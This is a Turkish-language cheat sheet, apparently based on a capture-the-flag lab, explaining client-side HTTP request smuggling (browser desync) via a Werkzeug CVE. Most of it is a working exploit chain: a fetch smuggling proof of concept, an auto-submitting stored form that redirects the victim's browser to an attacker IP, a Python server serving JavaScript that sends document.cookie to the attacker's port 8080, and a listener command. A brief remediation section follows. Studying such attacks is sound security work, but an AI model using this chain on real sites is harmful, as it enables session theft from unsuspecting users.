# 🚀 HTTP Browser Desync (Client-Side Request Smuggling) - Technical Cheat Sheet

**Zorluk Seviyesi:** Premium / Expert  
**Kategori:** Web Application Security, Advanced Request Smuggling, Exploit Chaining  
**Temel Konsept:** Geleneksel sunucu taraflı kaçakçılığın aksine, kurbanın tarayıcısı ile sunucu arasındaki TCP bağlantı kuyruğunu (Connection Queue) zehirleyerek oturum çalmak.

---

## 🌍 1. Temel Fark: Geleneksel vs. Browser Desync
* **Geleneksel İstek Kaçakçılığı:** Ön Sunucu (Proxy) ile Arka Sunucu (Backend) arasındaki iletişim kopukluğunu sömürür.
* **Browser Desync (CSD):** Arka sunucuya veya proxy'ye ihtiyaç duymaz. Kurbanın **kendi tarayıcısı (Browser)** ile sunucu arasındaki `Keep-Alive` bağlantısını senkronizasyondan çıkarır.

---

## ⚙️ 2. İstismara Açık HTTP Mekanizmaları
Bu saldırının gerçekleşebilmesi için tarayıcının performans artırıcı iki temel özelliği silahlaştırılır:
1. **Keep-Alive:** Tarayıcının, her dosya için yeni bağlantı açmak yerine aynı TCP bağlantısını açık tutarak çoklu istek/cevap almasıdır (Tasarruf borusu).
2. **Pipelining:** Tarayıcının, önceki isteklerin cevabını beklemeden aynı boru üzerinden peş peşe (seri) istek yollayabilmesidir.

---

## 🦠 3. Zafiyetin Anatomisi (CVE-2022-29361 - Werkzeug)
Hedef sunucunun, gelen bir `POST` isteğinin gövdesini (Body) tam okuyamayıp (veya yanlış hesaplayıp) erken kesmesi durumunda oluşur.

**Zehirleme (PoC):** Tarayıcının `fetch` API'si kullanılarak, meşru bir POST isteğinin gövdesine gizli bir komut yerleştirilir:
```javascript
fetch('[http://target.com/](http://target.com/)', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x', // Kaçak İstek (Smuggled Request)
    mode: 'cors',
})
```
* **Sonuç:** Sunucu `POST` isteğini okur, ancak gövdedeki `GET /redirect` kısmını okumadan boruda asılı bırakır. Kurban site içinde bir sonraki linke tıkladığında, tarayıcı sıradaki meşru isteği değil, boruda bekleyen bu zehirli isteği çalıştırır.

---

## 🔗 4. Exploit Chaining (Oturum Çalma Operasyonu)
Tek başına Desync sadece 404 hatasına yol açar. Bir kurbanın çerezlerini (Cookie) çalmak için **Stored XSS** noktalarıyla "Görünmez Form" taktiği zincirlenir.

### Adım 1: Truva Atını Yerleştirmek (Rogue HTML Form)
Hedef sistemde yorum bırakılabilen bir alana (Reflection Point) aşağıdaki zararlı form kaydedilir. Bu form kurbanın sayfasına yüklendiğinde otomatik `POST` atar ve tarayıcısını **Saldırganın Sunucusuna** yönlendirir:

```html
<form id="btn" action="[http://challenge.thm/](http://challenge.thm/)" method="POST" enctype="text/plain">
  <textarea name="GET http://<SALDIRGAN_IP>:1337 HTTP/1.1\r\nAAA: A">placeholder</textarea>
  <button type="submit">placeholder</button>
</form>
<script> btn.submit() </script>
```

### Adım 2: Zehirleyici Sunucuyu Kurmak (Port 1337)
Kurban tarayıcısı saldırganın sunucusuna geldiğinde, ona kurbanın kendi çerezlerini çalacak olan `fetch` payload'u yedirilir. Saldırgan kendi makinesinde aşağıdaki Python kodunu çalıştırır (`server.py`):

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")
            self.end_headers()
            # Kurbanın şifresini 8080 portumuza yollayan zehir!
            self.wfile.write(b"fetch('http://<SALDIRGAN_IP>:8080/?c=' + document.cookie)")

def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

### Adım 3: Ganimeti Toplamak (Port 8080)
Kurbanın JS kodunu çalıştırdıktan sonra çerezleri göndereceği dinleyici sunucu başlatılır:
```bash
sudo python3 -m http.server 8080
```
Kurban siteye girer, görünmez form çalışır, tarayıcı senkronizasyonunu kaybeder, saldırganın JS kodunu çeker ve kurbanın Cookie'si saldırganın 8080 terminaline düşer!

---

## 🛡️ 5. Güvenlik İhlali ve Etkisi (Impact)
* Tarayıcı bu işlemlerin hepsini aynı "meşru" TCP bağlantısı üzerinden yaptığı için **CORS (Cross-Origin Resource Sharing)** ve **SameSite** çerez kuralları tamamen işlevsiz kalır (Bypass).
* Sistemde geleneksel bir XSS açığı (Parametre yansıması) olmasa dahi, tarayıcı zorla XSS çalıştırmaya mecbur bırakılır.

## 🛠️ 6. Çözüm Önerileri (Remediation)
1. Backend sunucuların ve kütüphanelerin (Örn: Werkzeug) güncel versiyonlarda tutulması.
2. Web sunucusunun `Content-Length` ile gelen gövdeyi (Body) sıfır toleransla ve eksiksiz okuduğundan (veya reddettiğinden) emin olunması.
3. HTTP/2'nin uçtan uca kullanılması (HTTP/2'de veriler binary frame'ler halinde geldiği için bu tür boyut hesaplama hataları minimize edilir).
